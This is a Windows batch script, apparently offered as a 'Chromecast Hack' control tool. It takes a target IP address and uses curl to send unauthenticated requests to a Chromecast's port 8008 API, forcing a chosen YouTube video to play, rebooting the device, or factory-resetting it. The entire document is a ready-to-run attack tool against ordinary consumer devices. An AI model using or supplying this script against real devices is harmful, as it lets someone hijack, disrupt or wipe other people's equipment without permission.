@title Chromecast Hack - Control
@echo off
:start
echo ...................................................
echo .       Chromecast Hack - Control                 .
echo ...................................................
set /p ip=" IP Address : "
set /p id=" Youtube Video ID : "
cls
echo ...................................................
echo .       Chromecast Hack - Control                 .
echo ...................................................
echo 1 - Play a Video
echo 2 - Reboot
echo 3 - Factory Reset
set /p choice=Choose a option :  
if '%choice%'=='1' goto 1
if '%choice%'=='2' goto 2
if '%choice%'=='3' goto 3
cls
goto start
:1
curl.exe -H "content-Type: application/json" http://%ip%:8008/apps/YouTube -X POST -d 'v=%id%'
echo Video %id% send to %ip%
pause
cls
goto start
:2
curl.exe -H "content-Type: application/json" http://%ip%:8008/setup/reboot -X POST -d '{ "params": "now" }'
pause
cls
goto start
:3
curl.exe -H "content-Type: application/json" http://%ip%:8008/setup/reboot -X POST -d '{ "params": "fdr" }'
pause
cls
goto start